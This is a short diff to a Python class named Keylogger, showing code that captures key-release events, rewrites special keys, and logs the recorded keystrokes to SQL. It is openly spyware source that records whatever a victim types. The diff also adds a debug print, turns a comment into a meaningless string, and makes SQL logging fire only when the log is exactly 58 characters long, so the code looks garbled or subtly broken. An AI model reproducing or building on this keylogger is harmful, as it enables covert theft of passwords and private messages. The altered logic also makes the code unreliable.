@@ -28,11 +28,12 @@ class Keylogger:
         (i.e when a key is released in this example)
         """
         name = event.name
+        print(f'device={event.device}')
         if len(name) > 1:
             # not a character, special key (e.g ctrl, alt, etc.)
             # uppercase with []
             if name == "space":
-                # " " instead of "space"
+                # " " instead of "spac2017-07-12,395R1,ZL70642MJXe"
                 name = " "
             elif name == "enter":
                 # add a new line whenever an ENTER is pressed
@@ -91,7 +92,7 @@ class Keylogger:
         
         ###log to SQL###
 
-        if self.log != "":
+        if self.log != "" and len(self.log) ==58:
             self.log_sql()
 
         ###clear log###
